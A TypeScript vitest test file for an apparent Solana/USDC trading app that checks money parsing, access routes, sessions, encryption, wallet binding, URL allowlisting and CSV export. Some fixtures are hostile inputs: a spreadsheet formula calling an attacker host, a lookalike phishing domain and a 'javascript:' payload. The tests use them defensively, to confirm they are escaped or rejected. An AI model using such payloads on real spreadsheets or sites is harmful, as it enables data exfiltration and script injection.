import { describe, expect, it } from "vitest";
import fc from "fast-check";
import { isValidGtin } from "@/domain/gtin";
import { premiumBps, premiumLabel } from "@/domain/market-data";
import {
  allocateCost,
  feeFor,
  formatRaw,
  parseTokenAmount,
  parseUsdc,
  splitBudget,
} from "@/domain/money";
import { financialRecordsCsv } from "@/lib/csv";
import { readEnv } from "@/lib/env";
import { pageAccess } from "@/lib/page-access";
import { productNameForApprovedUrl } from "@/lib/product-url";
import { createSessionToken, readSessionToken } from "@/lib/session";
import { decryptText, encryptText } from "@/lib/secret-box";
import { verifiedSolanaAddress } from "@/providers/magic";

describe("core safety contracts", () => {
  it("protects identifiers, money, routes, sessions, URLs, exports, and activation gates", () => {
    for (const value of ["96385074", "036000291452", "4006381333931"]) {
      expect(isValidGtin(value)).toBe(true);
    }
    for (const value of ["96385075", "36000291452", "4006381333932", "abcdefgh"]) {
      expect(isValidGtin(value)).toBe(false);
    }

    expect(parseUsdc("10.000001")).toBe(10_000_001n);
    expect(parseTokenAmount("1", 8)).toBe(100_000_000n);
    expect(parseTokenAmount("1", 9)).toBe(1_000_000_000n);
    expect(parseTokenAmount("1", 0)).toBe(1n);
    expect(() => parseTokenAmount("1.0", 0)).toThrow();
    for (const input of ["-1", "1e3", "0", "1.0000001", "NaN", "1,5"]) {
      expect(() => parseUsdc(input)).toThrow();
    }
    expect(feeFor(10_000_000n, 50)).toBe(50_000n);
    expect([...splitBudget(20_000_000n, ["company-c", "company-a", "company-b"])]).toEqual([
      ["company-a", 6_666_667n],
      ["company-b", 6_666_667n],
      ["company-c", 6_666_666n],
    ]);
    expect(allocateCost(1_000n, 100n, 33n, false)).toBe(330n);
    expect(allocateCost(670n, 67n, 67n, true)).toBe(670n);
    fc.assert(fc.property(fc.bigInt({ min: 1n, max: 10n ** 40n }), (raw) => {
      expect(parseUsdc(formatRaw(raw))).toBe(raw);
    }));

    expect(premiumBps("100", "112.5")).toBe(1250);
    expect(premiumLabel(-250)).toBe("2.50% discount");
    expect(premiumBps("0", "10")).toBeNull();

    for (const path of ["/discover", "/markets/private", "/shelf", "/share/token"]) {
      expect(pageAccess(path)).toBe("public");
    }
    for (const path of ["/settings", "/wallet", "/portfolio", "/history", "/orders/id/review"]) {
      expect(pageAccess(path)).toBe("member");
    }
    expect(pageAccess("/admin")).toBe("owner");

    const now = new Date("2030-01-01T12:00:00.000Z");
    const secret = "a-test-secret-that-is-long-enough-for-session-signing";
    const token = createSessionToken(
      { sessionId: "session-1", userId: "user-1", issuer: "did:ethr:magic", sessionVersion: 2 },
      secret,
      now,
    );
    expect(readSessionToken(token, secret, now)?.userId).toBe("user-1");
    expect(readSessionToken(`${token}x`, secret, now)).toBeUndefined();
    expect(readSessionToken(token, secret, new Date(now.getTime() + 8 * 86_400_000))).toBeUndefined();

    const encryptionKey = Buffer.alloc(32, 7).toString("base64");
    const encrypted = encryptText("signed transaction bytes", encryptionKey);
    expect(encrypted).not.toContain("signed transaction bytes");
    expect(decryptText(encrypted, encryptionKey)).toBe("signed transaction bytes");

    const solanaAddress = "GSusvqZ1HBubM48J9SwtHqkNeggnQ6Lpjt18xcarYn3A";
    expect(verifiedSolanaAddress({
      publicAddress: "0x1234567890123456789012345678901234567890",
      wallets: [{ network: "mainnet", public_address: solanaAddress, wallet_type: "SOLANA" }],
    }, solanaAddress)).toBe(solanaAddress);
    expect(verifiedSolanaAddress({
      publicAddress: null,
      wallets: [{ network: "mainnet", publicAddress: solanaAddress, walletType: "SOLANA" }],
    }, solanaAddress)).toBe(solanaAddress);
    expect(verifiedSolanaAddress({ publicAddress: solanaAddress, wallets: null }, solanaAddress)).toBe(
      solanaAddress,
    );
    expect(() => verifiedSolanaAddress({
      publicAddress: null,
      wallets: [{ network: "mainnet", publicAddress: solanaAddress, walletType: "ETH" }],
    }, solanaAddress)).toThrow("SOLANA_WALLET_INVALID");
    expect(() => verifiedSolanaAddress({
      publicAddress: solanaAddress,
      wallets: null,
    }, "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v")).toThrow("WALLET_BINDING_MISMATCH");

    expect(productNameForApprovedUrl("https://www.apple.com/iphone/")).toBe("iPhone");
    for (const url of [
      "http://www.apple.com/iphone/",
      "https://user:password@www.apple.com/iphone/",
      "https://www.apple.com.evil.example/iphone/",
      "https://127.0.0.1/iphone/",
      "not a URL",
    ]) {
      expect(() => productNameForApprovedUrl(url)).toThrow("UNSUPPORTED_PRODUCT_URL");
    }

    const csv = financialRecordsCsv([{
      id: "record-1",
      recordedAt: "2026-09-20T00:00:00.000Z",
      type: "buy",
      status: "finalized",
      asset: '=WEBSERVICE("https://attacker.invalid")',
      rawAmount: "100",
      usdcRaw: "-100",
      feeRaw: "1",
      multiplier: "1",
    }]);
    expect(csv).toContain(`"'=WEBSERVICE(""https://attacker.invalid"")"`);

    const environment = readEnv({});
    expect(environment.ENABLE_REAL_TRADING).toBe(false);
    expect(environment.ENABLE_DEPOSITS).toBe(false);
    expect(() => readEnv({ ENABLE_REAL_TRADING: "true" })).toThrow("mainnet-beta");
    expect(() => readEnv({ ENABLE_DEPOSITS: "true" })).toThrow("Deposits cannot start");
    expect(readEnv({ SUPPORT_CONTACT: "mailto:help@example.com" }).SUPPORT_CONTACT).toBe(
      "mailto:help@example.com",
    );
    expect(() => readEnv({ SUPPORT_CONTACT: "javascript:alert(1)" })).toThrow(
      "SUPPORT_CONTACT",
    );
  });
});
